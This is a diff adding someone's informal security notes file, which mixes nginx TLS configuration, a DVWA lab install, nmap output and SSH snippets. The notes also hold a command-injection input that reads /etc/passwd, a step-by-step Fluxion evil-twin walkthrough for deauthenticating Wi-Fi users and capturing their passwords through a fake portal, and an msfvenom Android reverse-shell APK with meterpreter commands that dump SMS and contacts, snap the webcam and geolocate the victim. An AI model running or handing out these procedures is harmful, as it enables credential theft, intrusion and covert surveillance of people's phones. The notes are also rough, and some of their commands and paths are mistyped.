@@ -1,0 +1,344 @@
+# NGINX NAXSI
+# https://www.youtube.com/watch?v=JiJHCodn_PQ
+# https://www.youtube.com/watch?v=dsTub1_4Upg
+#------------------------------------------------------------------------------
+A lot of customization, we do hosting 
+Web application, Classical IT
+
+
+Cipher Suites     # SSL used it
+
+
+   ECDHE     -      RSA        -  AES256-GCM     - SHA384    
+Key Exchange - Cerfificate Key - Trasport Cipher - Integrity
+
+
+# how to create a CSR and private key?
+# Certificate request  
+# StartSSL.com
+# Using CFSSL
+
+# Using OpenSSL
+openssl genrsa -out key.pem 2048
+openssl req -new -sha256 -key key.pem -out key.csr
+
+
+# Configuration NGINX
+Recommend at least 1.0.1p  (openssl )
+
+
+server {
+  listen 444 ssl
+
+  ssl_certificate /path/to/signed_cert_plus_intermediates;
+  ssl_certificate_key /path/to/private_key;
+
+  ssl_session_cache shared:SSL:50m;    # workers 
+  ssl_session_timeout 1d;
+
+  # session tickets 
+}
+
+
+# tools  jack tutorials
+#------------------------------------------------------------------------------
+Aircrack
+Airodump
+Bully
+Nmap
+
+
+#emove code Injection
+#------------------------------------------------------------------------------
+https://www.youtube.com/watch?v=AuNwk--lfxU#t=38.613354
+
+http://www.dvwa.co.uk/
+DVWA tutorial/security
+command injection or remote code executing
+
+
+Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and aid teachers/students to teach/learn web application security in a class room environment.
+
+sudo apt-get install mysql-server
+sudo apt-get install unzip apache2 php5 php5-mysql php-pear
+cd /var/www/html
+wget https://github.com/RandomStorm/DVWA/archive/v1.0.8.zip
+rm v1.0.8.zip
+mv DVWA-1.0.8 dvwa
+vim dvwa/config/config.inc.php
+"""
+$_DVWA[ 'db_password' ] = 'p@ssw0rd';
+
+and replace “p@ssw0rd” with your MySQL password.
+"""
+
+cd
+vim /etc/php5/apache2/php.ini
+"""
+allow_url_include = Off
+
+and replace “Off” with “On”
+"""
+chmod -R 777 /var/www/html/dvwa
+mysql -u root -p
+create database dcwa;
+exit
+
+vim /etc/apache2/apache2.conf
+"""
+Move to the bottom of the file and add the following line:
+
+ServerName localhost
+"""
+
+service apache2 start
+
+http://192.168.0.171/dvwa/setup.php
+
+Create Reset Database
+
+http://192.168.0.20/dvwa/
+
+and log in with the following credentials:
+
+username: admin
+
+password: password
+
+https://linuxsecurityblog.com/2016/01/28/install-dvwa-on-ubuntu/
+
+
+!!!!!!!
+XAMPP can be downloaded from: https://www.apachefriends.org/en/xampp.html
+Simply unzip dvwa.zip, place the unzipped files in your public html folder, then point your browser to: http://127.0.0.1/dvwa/setup.php
+!!!!!!
+
+Ping device
+ping-c 4 192.168.0.171
+
+
+
+DvWA > Command injection > 191.168.0.171; cat /etc/passwd
+
+# wifi 
+#------------------------------------------------------------------------------
+https://www.youtube.com/watch?v=Pc8JCiRZ-4w
+# man in the middle 
+
+FLuxion -> Flusion is a remake of linset by vk496 with less bugs and more features. It's compatible with Kali
+
+Rowsberri Pie
+
+Scan the networks
+Capture a handshake  - capture a handshake automaticaly
+Use WEB Inter
+Launch a FakeAP   -> imitate access point
+Spawns a MDK3 process  -> deauthenticate all Users
+A fake DNS
+A captive portal
+Each submitted password is verified
+
+
+copy the script from Flusion git 
+# you need two wireless cards and at list one package ingestion 
+
+cd .ssh
+Host rudik
+  Hostname 192.168.1.171
+  User root
+
+sudo apt-get install git
+git clone https://github.com/deltaxflux/fluxion.git
+ls 
+cd fluxion
+ls
+./Installer.sh
+# inside graphical session
+sudo apt-get install tightvncserver
+tightvncserver 
+# it starts desktop 
+# open new terminal
+vncviewer 192.168.1.171:2    
+# it loads desktop
+
+# inside graptical session run
+./Installer.sh
+
+
+./fluxion
+> Select an interface: wifi with packing injecting interface
+  > Select channel: All Channel
+    # find all wifis
+    CTRL+C
+   #> 6   (Run on channel 6)
+   # Select 
+   #> 1) FakeAP - Hostapd (Recommended)     # man in the middle attack
+   #  2) FakeAP - airbase-ng (Slower connection)
+   #  3) WPS-SLAUGHTER - Bruteforce WPS Pin
+   #  4) Bruteforce - (Handshake is required)  - traditional
+   #  5) Back
+
+   Path:  <enter>
+   Handshake check (1)
+      1) aircrack-ng  (Miss change)
+      2) pyrit
+   Capture Handshake
+      1) Deauth all
+      2) Deauth all [mdk3]
+      3) Deauth target (only one)
+      4) Rescan networks
+      5) Exit
+   > no can't reach the wifi network, connecting, keep connecting but not let me to wifi
+       > when i close the window i can connec
+
+   Status handshake:
+      1) Check handshake   (1)
+      2) Back (Select another deauth method)
+      3) Select another network
+      4) Exit
+      
+   Select your option
+      1) Web interface   (1)
+      2) Bruteforce
+      3) Exit
+
+   Select Login Page (or create your own in)
+     English login page (1)
+
+   
+   > it will connect to new network with the same name
+> user enters the password and we are in
+
+
+# start the fluxion again now we have a handshake
+./flusion
+# handshake location (Example: /root/fluxion.cap)
+Press ENTER to skip
+Path: /root/handshakes/<name>.cap
+
+
+
+
+   
+
+
+
+
+
+# GO THERE the bit security organization with Tesla, , check tutorial
+#------------------------------------------------------------------------------
+bugcrowd 
+
+# android 
+#------------------------------------------------------------------------------
+https://www.youtube.com/watch?v=hDsdpbAWrKA
+
+# on the same network phone and kali
+# pay load
+# LHOST is my ip from ifconfig; this will send to user
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.171 LPORT=4444 R >shell.apk
+
+get the file on android 
+
+msfconsole
+msf > use exploit/multi/handler
+> set payload android/meterpreter/reverse_tcp
+> set LHOST 192.168.1.171
+> set LPORT 4444
+> exploit
+>> this will start lisening
+
+meterpreter > help
+> check_root
+> ls
+> webcam_snap 2
+> webcam_snap 1
+> shell                # get inside shell
+> sysinfo              # 
+> dump_contacts   
+> dump_sms
+> geolocate
+> exit
+
+
+
+service apache2 start
+ 
+# nmap network mapper 
+#------------------------------------------------------------------------------
+https://n0where.net/security-auditing-tool-lynis/
+ifconfig
+
+# list of host on the x.x.x.<0-255>
+nmap -sP 10.0.0.0/24
+
+kuntuzangmo@kuntuzangpo:~$ sudo nmap -sS -A 192.168.0.171
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-10-17 21:11 CEST
+Nmap scan report for 192.168.0.171
+Host is up (0.000032s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE    VERSION
+80/tcp   open  http       nginx 1.10.0 (Ubuntu)
+|_http-server-header: nginx/1.10.0 (Ubuntu)
+|_http-title: Welcome to nginx!
+3128/tcp open  http-proxy Squid http proxy 3.5.12
+|_http-server-header: squid/3.5.12
+|_http-title: ERROR: The requested URL could not be retrieved
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3
+OS details: Linux 3.12 - 3.19, Linux 3.8 - 3.19
+Network Distance: 0 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.06 seconds
+
+
+ametist
+
+# NGINX NASXI 
+#------------------------------------------------------------------------------
+https://github.com/nbs-system/naxsi/wiki/naxsi-setup
+
+
+
+
+# hodnoceni
+https://n0where.net/nginx-web-application-firewall-naxsi/
+
+
+# Security
+#------------------------------------------------------------------------------
+# Kali security hodnoceni
+https://n0where.net/security-auditing-tool-lynis/
+
+Kali Linux ? Vulnerability Analysis > Misc Scanners > Lynis
+
+lynis --check-all --no-log --quick
+
+#  SSH
+#------------------------------------------------------------------------------
+# open ports
+ssh <user>@<hostname> netstat -vatn
+ssh <user>@<hostname> ls
+ssh <user>@<hostname> '/etc/init.d/mysql restart'
+# get from server and store locali
+ssh <user>@<hostname> 'cp ~/apache/sites/*/conf/worker.workers' > ~/tmp/apache/sites/conf
+
+#  Citrix
+#------------------------------------------------------------------------------
+https://portal.comproof.net/vpn/index.html
+
+# KILL Citrix 
+/opt/Citrix/ICAClient/wfica -icaroot /opt/Citrix/ICAClient /tmp/mozilla_kuntuzangmo0/Q2xhcmEuUmVtb3RlIERlc2t0b3A-.ica
+
+
+# WIFI Start wlp2s0
+#------------------------------------------------------------------------------
+/sbin/dhclient -d -q -sf /usr/lib/NetworkManager/nm-dhcp-helper -pf /var/run/dhclient-wlp2s0.pid -lf /var/lib/Net
+
+
+
+
